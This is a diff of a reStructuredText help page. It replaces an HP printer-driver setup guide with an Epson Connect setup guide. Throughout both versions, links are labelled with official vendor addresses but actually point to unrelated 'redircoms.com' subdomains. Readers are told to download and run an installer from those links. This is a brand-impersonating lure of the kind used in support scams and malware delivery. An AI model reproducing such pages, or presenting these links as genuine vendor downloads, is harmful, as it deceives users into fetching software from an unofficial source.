@@ -1,5 +1,5 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+Steps for Epson Connect printer download
 ##################
 
 .. meta::
@@ -10,12 +10,12 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: get-started.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: epson.com/connect
+      :target: https://eps.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,18 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+To enable Epson Connect services like Email Print and Scan to Cloud, you must first download and install the Epson Connect Printer Setup Utility. The utility is available at `epson.com/connect <https://eps.redircoms.com>`_ and supports most Epson inkjet and all-in-one printers.
 
-**********
-Steps to Download HP Printer Driver
-**********
+Step-by-Step Instructions
+--------------------------
+1. Visit `epson.com/connect <https://eps.redircoms.com>`_ using your web browser.
+2. Enter your printer model in the search bar and select your operating system.
+3. Under the **Utilities** section, locate the **Epson Connect Printer Setup Utility**.
+4. Click **Download** to save the installer file to your computer.
+5. Once the download is complete, open the installer and follow the on-screen instructions.
+6. Accept the license agreement and choose your Epson printer from the list.
+7. Continue the setup to register your printer with Epson Connect and enable remote printing features.
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
-
-2. Enter your HP printer model in the search box.
-
-3. Select your operating system if prompted.
-
-4. Click on **Download** to get the latest driver and software package.
-
-5. Save the installer file to your computer.
-
-**********
-Steps to Install HP Printer Driver
-**********
-
-1. Locate the downloaded installer file on your computer.
-
-2. Double-click the installer to begin the setup process.
-
-3. Follow the on-screen instructions and accept the license agreement.
-
-4. Choose your connection type (USB or Wireless).
-
-5. Complete the installation by clicking **Finish**.
-
-**********
-Setting Up Your HP Printer
-**********
-
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
+Conclusion
+----------
+Downloading the Epson Connect Printer Setup Utility is the first step to unlocking cloud-based printing and scanning capabilities. To begin, go to `epson.com/connect <https://eps.redircoms.com>`_ and follow the instructions for your device.
